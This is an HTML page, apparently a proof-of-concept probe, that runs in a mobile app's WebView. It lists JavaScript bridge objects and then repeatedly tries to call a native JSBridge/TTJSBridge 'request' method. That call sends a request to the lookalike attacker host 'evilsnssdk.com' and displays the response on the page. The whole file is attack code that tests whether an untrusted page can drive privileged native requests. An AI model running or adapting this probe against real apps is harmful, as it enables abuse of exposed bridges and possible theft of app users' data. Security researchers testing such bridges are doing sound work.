<!DOCTYPE html>
<html>
<body>
<div id="status">页面加载中...</div>
<div id="response"></div>

<script>
// 1. 确认页面加载
document.getElementById('status').innerHTML = '✅ 页面已加载';

// 2. 诊断信息
var info = [
    'URL: ' + window.location.href,
    'UA: ' + navigator.userAgent,
    'JSBridge: ' + typeof window.JSBridge,
    'TTJSBridge: ' + typeof window.TTJSBridge,
    'Bridge 相关对象: ' + Object.keys(window).filter(k => /bridge|jsb/i.test(k)).join(', ')
];
document.getElementById('response').innerHTML = info.join('<br><br>');

// 3. 等待并调用
function tryCall() {
    var bridge = window.JSBridge || window.TTJSBridge;
    if (bridge && typeof bridge.call === 'function') {
        bridge.call('request', {
            url: 'https://evilsnssdk.com/jsb_test/33eca3a2f55edf4c712978f44c9bbf19/1/177041520205822863',
            method: 'GET'
        }, function(res) {
            document.getElementById('response').innerHTML = 
                '<pre>' + JSON.stringify(res, null, 2) + '</pre>';
        });
    } else {
        setTimeout(tryCall, 500);
    }
}
setTimeout(tryCall, 1000);
</script>
</body>
</html>
